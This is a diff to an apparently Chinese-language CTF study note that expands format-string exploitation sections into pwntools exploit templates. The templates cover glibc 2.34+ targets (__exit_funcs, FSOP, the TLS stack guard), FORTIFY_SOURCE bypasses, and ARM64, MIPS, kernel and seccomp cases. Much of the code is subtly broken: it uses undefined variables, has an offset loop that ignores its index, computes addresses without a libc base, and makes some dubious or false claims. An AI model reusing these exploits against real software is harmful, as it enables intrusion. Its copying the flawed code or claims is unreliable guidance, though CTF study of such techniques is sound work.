@@ -215,68 +215,362 @@ p.sendline(b'/bin/sh')  # 触发 free
 
 ## 2024-2026 新技术点
 
-### 1. glibc 2.34+ 利用
+### 1. glibc 2.34+ 格式化字符串利用
 
 ```python
-# 无 hooks
-# 1. 覆盖 __exit_funcs
-# 2. 覆盖 _IO_FILE
-# 3. 覆盖 TLS 中的 __stack_chk_guard
-# 4. 覆盖 _environ 泄露栈地址
+# glibc 2.34+ 移除 hooks，格式化字符串需转向新的利用目标
+# 目标：__exit_funcs / IO_FILE / TLS 中的数据
+
+from pwn import *
+
+context.arch = 'amd64'
+p = process('./pwn')
+elf = ELF('./pwn')
+libc = ELF('./libc.so.6')
+
+# === 方案 1：覆盖 __exit_funcs ===
+# __exit_funcs 指向 exit_function_list
+# 修改为伪造的 list，exit() 时执行任意函数
+
+# 先泄露 libc
+p.sendline(b'%7$p')
+libc_leak = int(p.recv(), 16)
+libc_base = libc_leak - libc.symbols['__libc_start_main'] - 243
+log.success(f"libc base: {hex(libc_base)}")
+
+# 覆盖 __exit_funcs 为 system
+system_addr = libc_base + libc.symbols['system']
+exit_funcs = libc_base + libc.symbols['__exit_funcs']
+
+payload = fmtstr_payload(6, {exit_funcs: system_addr})
+p.sendline(payload)
+
+# 触发 exit，system 被调用
+# 注意：需要在 exit 之前将参数布置好
+# 或者覆盖为 one_gadget
+
+# === 方案 2：覆盖 _IO_list_all 进行 FSOP ===
+io_list_all = libc_base + libc.symbols['_IO_list_all']
+# 构造 fake IO_FILE，覆盖 _IO_list_all 指向 fake
+payload2 = fmtstr_payload(6, {io_list_all: fake_file_addr})
+p.sendline(payload2)
+
+# === 方案 3：覆盖 TLS 中的 __stack_chk_guard ===
+# 泄露栈地址后，定位 TLS 中的 __stack_chk_guard
+# 覆盖为已知值，绕过栈保护
+stack_guard_addr = tls_addr + offset_to_stack_guard
+known_value = 0x4141414141414141
+payload3 = fmtstr_payload(6, {stack_guard_addr: known_value})
 ```
 
-### 2. FORTIFY_SOURCE
+### 2. FORTIFY_SOURCE 绕过
 
 ```python
-# GCC FORTIFY_SOURCE 检测格式化字符串
-# %n 在某些情况下被禁用
-# 需要绕过
+# GCC FORTIFY_SOURCE 在编译时检测危险的格式化字符串用法
+# 某些情况下限制 %n 的使用
+
+from pwn import *
+
+# 绕过方法 1：利用运行时动态生成的格式化字符串
+# 如果格式化字符串在栈上且每次运行不同，FORTIFY 无法静态检测
+
+def bypass_fortify_dynamic():
+    """当格式化字符串从堆/栈动态生成时"""
+    p = process('./pwn')
+    # 构造格式化字符串在堆上
+    # 通过多次 printf 调用分步写入
+    # 使用 %hhn (写 1 字节) 减小 payload 大小
+    
+    target = 0x404020
+    value = 0x41
+    
+    # 写 1 字节示例
+    # payload = p64(target) + b'%c' * (value - 8) + b'%7$hhn'
+    # 注意：FORTIFY 会检查 $ 使用
+    # 如果 $ 被过滤，改用无 $ 的方式
+    
+    pass
+
+# 绕过方法 2：无 $ 的格式化字符串攻击
+def no_dollar_fmtstr(offset):
+    """不使用 $ 直接偏移，改用栈上布局"""
+    # 在栈上布置目标地址和格式化字符串
+    # 通过 %c 跳过不需要的参数
+    # 利用 %n 写入
+    
+    target = 0x404020
+    payload = p64(target)
+    # 填充到正确的偏移位置
+    # 然后 %n 写入
+    pass
+
+# 绕过方法 3：利用 printf 的返回值
+def fmtstr_return_value():
+    """printf 返回输出的字符数，可作为信息泄露"""
+    p = process('./pwn')
+    # 发送 %c 输出 1 字节，返回值 = 1
+    # 发送 %100c 输出 100 字节，返回值 = 100
+    # 可以用于逐字节泄露
+    p.sendline(b'%1c%9$hhn')
+    # 返回值 = 1，说明第 9 个参数的最低字节是 1
+    pass
 ```
 
-### 3. 现代编译器优化
+### 3. 现代编译器优化绕过
 
 ```python
-# GCC 13+ 对格式化字符串的优化
-# 可能影响偏移计算
+# GCC 13+/Clang 17+ 对格式化字符串的新优化
+# - 可能优化栈上布局
+# - 可能改变参数传递方式
+
+from pwn import *
+
+def detect_offset_new_compiler():
+    """在新编译器下确定格式化字符串偏移"""
+    p = process('./pwn')
+    
+    # 方法 1：使用 AAAA + %p 逐个探测
+    probe = b'AAAA'
+    for i in range(1, 50):
+        probe += f'.%{i}$p'.encode()
+    p.sendline(probe)
+    result = p.recv()
+    
+    # 查找 0x41414141 的位置
+    for i in range(1, 50):
+        val = f'0x41414141'
+        if val.encode() in result:
+            log.success(f"offset found: {i}")
+            return i
+    
+    # 方法 2：使用 cyclic pattern
+    # 构造 cyclic pattern 并查找崩溃偏移
+    return None
+
+def exploit_with_modern_compiler():
+    """适配新编译器的利用模板"""
+    p = process('./pwn')
+    elf = ELF('./pwn')
+    libc = ELF('./libc.so.6')
+    
+    offset = detect_offset_new_compiler()
+    
+    # 使用 fmtstr_payload 时指定写入大小
+    # 优先使用 %hhn (1字节) 或 %hn (2字节) 减小 payload
+    target = elf.got['printf']
+    system_addr = libc.symbols['system']
+    
+    # 分步写入（避免 payload 过大）
+    # 第一次：泄露 libc
+    payload_leak = f'%{offset}$p'.encode()
+    p.sendline(payload_leak)
+    leak = int(p.recv(), 16)
+    
+    # 第二次：覆盖 GOT
+    payload_write = fmtstr_payload(offset, {target: system_addr}, write_size='byte')
+    p.sendline(payload_write)
+    p.sendline(b'/bin/sh')
 ```
 
 ### 4. ARM64 格式化字符串
 
 ```python
-# ARM64 调用约定
-# 前 8 个参数在寄存器 x0-x7
-# 偏移计算不同
+# ARM64 调用约定：前 8 个参数在 x0-x7 寄存器
+# printf 的格式化字符串在 x0，后续参数在 x1-x7 和栈上
+
+from pwn import *
+
+context.arch = 'aarch64'
+
+def arm64_fmtstr_exploit():
+    """ARM64 格式化字符串利用"""
+    p = process('./pwn')
+    
+    # ARM64 偏移计算：
+    # x0 = 格式化字符串本身（不算参数偏移）
+    # x1-x7 = 第 1-7 个参数
+    # sp+0 = 第 8 个参数
+    # sp+8 = 第 9 个参数
+    # ...
+    
+    # 探测偏移
+    p.sendline(b'AAAA.%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x.%9$x.%10$x')
+    result = p.recv()
+    
+    # ARM64 使用 $ 时偏移从 0 开始（x1 = offset 0）
+    # 与 x86 从 1 开始不同
+    
+    # 泄露示例
+    def leak(elf, offset):
+        payload = f'%{offset}$p'.encode()
+        p.sendline(payload)
+        return int(p.recv(), 16)
+    
+    # 写入示例
+    def write_byte(addr, val, offset):
+        payload = fmtstr_payload(offset, {addr: val}, write_size='byte')
+        p.sendline(payload)
+    
+    return p
 ```
 
 ### 5. 内核格式化字符串
 
 ```python
-# 内核中的 printk
-# 通过格式化字符串泄露内核地址
-# 通过格式化字符串写内核数据
+# 内核中的 printk/vsprintf 等格式化字符串利用
+# 通过 /proc 或 sysctl 接口触发
+
+from pwn import *
+
+# 内核格式化字符串泄露内核地址
+def kernel_fmtstr_leak():
+    """通过格式化字符串泄露内核地址"""
+    # 常见泄露目标：
+    # 1. 栈上的返回地址 -> 内核基址
+    # 2. pt_regs 结构体 -> 用户态寄存器
+    # 3. 页表基址
+    
+    # %p 泄露内核指针（需要注意 KASLR）
+    # 在较新内核中 %p 会打印哈希值
+    # 需要使用 %px (需要 CAP_SYSLOG)
+    
+    pass
+
+def kernel_fmtstr_write():
+    """内核格式化字符串写入"""
+    # 通过 %n 在内核中写入
+    # 目标：
+    # 1. 覆盖 cred 结构体提权
+    # 2. 覆盖函数指针
+    # 3. 覆盖页表项
+    
+    # 保护机制：
+    # - %n 需要 CAP_SYSLOG (较新内核)
+    # - KASLR
+    # - SMAP/SMEP
+    # - PAN (ARM)
+    
+    pass
 ```
 
-### 6. 嵌入式设备
+### 6. 嵌入式设备格式化字符串
 
 ```python
-# 路由器、摄像头等
+# 路由器、摄像头等嵌入式设备上的格式化字符串漏洞
 # MIPS/ARM 架构
-# 格式化字符串漏洞常见
+
+from pwn import *
+
+# MIPS 格式化字符串
+def mips_fmtstr():
+    """MIPS 架构格式化字符串"""
+    context.arch = 'mips'
+    
+    # MIPS 调用约定：
+    # $a0-$a3 = 前 4 个参数
+    # 栈上传递第 5+ 个参数
+    # 格式化字符串在 $a0
+    
+    # 偏移计算：
+    # offset 1-4 对应 $a0-$a3（不算）
+    # offset 5 对应栈上的第一个参数
+    
+    # 利用方式与 x86 类似，但偏移不同
+    pass
+
+# ARM 嵌入式设备
+def arm_embedded_fmtstr():
+    """ARM 32 位嵌入式设备格式化字符串"""
+    context.arch = 'arm'
+    
+    # ARM 调用约定：
+    # r0-r3 = 前 4 个参数
+    # 栈上传递第 5+ 个参数
+    
+    # 注意嵌入式设备特点：
+    # 1. 无 ASLR / 简单 ASLR
+    # 2. 可能无 NX
+    # 3. 小端/大端需注意
+    # 4. 固件中可能有后门
+    
+    pass
 ```
 
-### 7. 现代语言
+### 7. 现代语言格式化字符串
 
 ```python
-# Rust 的 format!
-# Go 的 fmt.Printf
-# 各语言的格式化字符串漏洞
+# Rust/Go 等现代语言中的格式化字符串漏洞
+
+# === Rust ===
+# Rust 的 format! 宏在编译时检查
+# 但运行时动态格式化仍有风险
+def rust_fmtstr():
+    """
+    // 危险代码（Rust）
+    let s = format!("{}", user_input);  // 安全：编译时检查
+    let s = user_input.clone();         // 危险：直接使用
+    // 在 C FFI 中传递格式化字符串也可能有漏洞
+    """
+    pass
+
+# === Go ===
+# Go 的 fmt.Printf 在编译时检查参数数量
+# 但 fmt.Sprintf 的格式化字符串如果来自用户输入则有风险
+def go_fmtstr():
+    """
+    // 危险代码（Go）
+    fmt.Printf(userInput)  // 直接使用用户输入
+    fmt.Sprintf(userInput)  // 格式化字符串来自用户
+    
+    // Go 的 fmt 包使用 reflect 调用
+    // 可以泄露栈上的指针（ASLR 绕过）
+    // %p 可以泄露 goroutine 地址、堆地址
+    """
+    pass
 ```
 
-### 8. 沙箱环境
+### 8. 沙箱环境格式化字符串
 
 ```python
-# seccomp 限制
-# 通过格式化字符串绕过
+# seccomp 限制下的格式化字符串利用
+
+from pwn import *
+
+def fmtstr_with_seccomp():
+    """seccomp 禁止 execve 时的格式化字符串利用"""
+    p = process('./pwn')
+    elf = ELF('./pwn')
+    libc = ELF('./libc.so.6')
+    
+    # 方法 1：格式化字符串 + ORW
+    # 通过格式化字符串泄露地址
+    # 构造 ROP 链执行 open/read/write
+    
+    # 方法 2：格式化字符串覆盖 IO_FILE
+    # 构造 fake IO_FILE 执行 ORW
+    
+    # 方法 3：格式化字符串 + 侧信道
+    # seccomp 的 SECCOMP_RET_TRACE 可以 ptrace 交互
+    
+    # 完整利用流程
+    offset = 6  # 假设偏移
+    
+    # Step 1: 泄露 libc
+    p.sendline(f'%{offset + 4}$p'.encode())
+    libc_leak = int(p.recv(), 16)
+    libc_base = libc_leak - libc.symbols['__libc_start_main'] - 243
+    
+    # Step 2: 泄露栈地址（用于 _environ）
+    p.sendline(f'%{offset + 8}$p'.encode())
+    stack_leak = int(p.recv(), 16)
+    
+    # Step 3: 覆盖 _IO_write_ptr 等控制 IO 流向
+    # 实现信息泄露或代码执行
+    
+    # Step 4: 通过 IO_FILE 实现 ORW
+    # open("flag", 0) -> read(fd, buf, size) -> write(1, buf, size)
+    
+    p.interactive()
 ```
 
 ## 工具推荐
